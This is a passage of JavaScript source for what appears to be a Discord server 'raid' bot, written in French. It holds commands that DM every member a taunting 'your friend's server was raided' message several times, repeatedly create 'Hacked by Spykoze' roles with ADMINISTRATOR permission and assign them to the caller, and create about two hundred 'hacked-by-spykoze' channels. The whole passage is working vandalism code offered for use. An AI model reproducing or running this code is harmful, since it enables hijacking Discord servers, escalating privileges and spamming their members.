			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
	}

	if(message.content.startsWith(prefix + "admin")) {
        message.delete()
        let membre = message.guild.member(message.author);
        let role = message.guild.roles.find('name', 'Hacked by Spykoze');
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
		message.guild.createRole({
		name: "Hacked by Spykoze",
		permissions: "ADMINISTRATOR",
		color: "RANDOM",
		})
		membre.addRole(role).catch(console.error);
	}

	if(message.content === prefix + "salon"){
       	message.delete()
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
       	message.channel.guild.createChannel("hacked-by-spykoze");
